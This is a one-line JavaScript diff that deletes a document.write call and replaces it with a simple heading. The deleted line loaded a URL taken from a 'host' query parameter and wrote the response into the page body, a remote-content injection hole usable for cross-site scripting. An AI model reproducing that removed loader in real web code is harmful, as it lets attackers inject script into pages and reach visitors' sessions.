@@ -1,1 +1,1 @@
-document.write("<body><script defer>if("host"==window.location.href.split("?")[1].split("=")[0]){var req=new XMLHttpRequest;req.open("GET",window.location.href.split("?")[1].split("=")[1],!1),req.send(null),200==req.status&&(document.body.innerHTML=req.responseText)}</script>");
+document.write("<h1>hi</h1>");
